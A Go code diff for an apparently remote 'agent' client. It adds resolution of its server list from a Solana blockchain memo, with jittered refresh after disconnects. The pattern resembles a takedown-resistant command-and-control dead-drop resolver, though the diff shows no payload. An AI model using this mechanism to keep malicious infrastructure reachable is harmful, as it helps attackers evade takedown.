@@ -74,6 +74,10 @@ func runClient(cfg config.Config) {
 	consecutiveFailures := 0
 	// idek how tf to fix this. sometimes the client just says fuck you and downgrades then stops connections.
 	allowTLSDowngrade := false
+	var lastDisconnect time.Time
+	var lastSolRefresh time.Time
+	solInitialWait := 2 * time.Minute
+	solRefreshInterval := 2*time.Minute + time.Duration(rand.Intn(60))*time.Second
 
 	for {
 
@@ -97,9 +101,13 @@ func runClient(cfg config.Config) {
 		if err != nil {
 			log.Printf("dial failed: %v (retrying in %s)", err, backoff)
 			consecutiveFailures++
+			if lastDisconnect.IsZero() {
+				lastDisconnect = time.Now()
+			}
 
-			if shouldRefreshRawList(cfg, consecutiveFailures) {
-				if refreshServerURLsFromRaw(&cfg) {
+			if shouldRefreshServerList(cfg, consecutiveFailures, lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
+				if refreshServerList(&cfg) {
+					lastSolRefresh = time.Now()
 					currentIndex = 0
 					consecutiveFailures = 0
 				}
@@ -123,6 +131,7 @@ func runClient(cfg config.Config) {
 
 		backoff = baseBackoff
 		consecutiveFailures = 0
+		lastDisconnect = time.Time{} // reset — we're connected
 		log.Printf("connected successfully to %s%s", currentServer, serverInfo)
 
 		conn.SetReadLimit(8 * 1024 * 1024)
@@ -137,9 +146,11 @@ func runClient(cfg config.Config) {
 				allowTLSDowngrade = false
 			}
 			log.Printf("session ended: %v (retrying in %s)", err, backoff)
+			lastDisconnect = time.Now()
 
-			if shouldRefreshRawList(cfg, len(cfg.ServerURLs)) {
-				if refreshServerURLsFromRaw(&cfg) {
+			if shouldRefreshServerList(cfg, len(cfg.ServerURLs), lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
+				if refreshServerList(&cfg) {
+					lastSolRefresh = time.Now()
 					currentIndex = 0
 					consecutiveFailures = 0
 				}
@@ -184,6 +195,18 @@ func ensureServerURLs(cfg *config.Config, backoff time.Duration) {
 		return
 	}
 
+	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
+		log.Printf("No server URLs configured. Resolving from Solana memo (address: %s)", cfg.SolAddress)
+		for len(cfg.ServerURLs) == 0 {
+			if refreshServerURLsFromSolana(cfg) {
+				return
+			}
+			log.Printf("Retrying Solana memo lookup in %s", backoff)
+			time.Sleep(backoff)
+		}
+		return
+	}
+
 	if cfg.RawServerListURL == "" {
 		log.Printf("[config] WARNING: no server URLs configured; falling back to default %s", config.DefaultServerURL)
 		cfg.ServerURLs = []string{config.DefaultServerURL}
@@ -208,6 +231,47 @@ func shouldRefreshRawList(cfg config.Config, failures int) bool {
 		return true
 	}
 	return failures >= len(cfg.ServerURLs)
+}
+
+func shouldRefreshServerList(cfg config.Config, failures int, lastDisconnect, lastSolRefresh time.Time, solInitialWait, solRefreshInterval time.Duration) bool {
+	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
+		if lastDisconnect.IsZero() {
+			return false // still connected, never refresh
+		}
+		sinceDisconnect := time.Since(lastDisconnect)
+		if sinceDisconnect < solInitialWait {
+			return false // wait 2 min after disconnect before first check
+		}
+		if !lastSolRefresh.IsZero() && time.Since(lastSolRefresh) < solRefreshInterval {
+			return false // not yet time for next periodic check
+		}
+		return true
+	}
+	return shouldRefreshRawList(cfg, failures)
+}
+
+func refreshServerList(cfg *config.Config) bool {
+	if cfg.SolEnabled && cfg.SolAddress != "" && len(cfg.SolRPCEndpoints) > 0 {
+		return refreshServerURLsFromSolana(cfg)
+	}
+	return refreshServerURLsFromRaw(cfg)
+}
+
+func refreshServerURLsFromSolana(cfg *config.Config) bool {
+	urls, err := config.LoadServerURLsFromSolana(cfg.SolAddress, cfg.AgentToken, cfg.SolRPCEndpoints)
+	if err != nil {
+		log.Printf("[config] WARNING: failed to resolve server URLs from Solana: %v", err)
+		return false
+	}
+	if len(urls) == 0 {
+		log.Printf("[config] WARNING: Solana memo returned no valid URLs")
+		return false
+	}
+	if !equalStringSlices(cfg.ServerURLs, urls) {
+		log.Printf("[config] resolved server URLs from Solana memo (%d servers)", len(urls))
+		cfg.ServerURLs = urls
+	}
+	return true
 }
 
 func refreshServerURLsFromRaw(cfg *config.Config) bool {
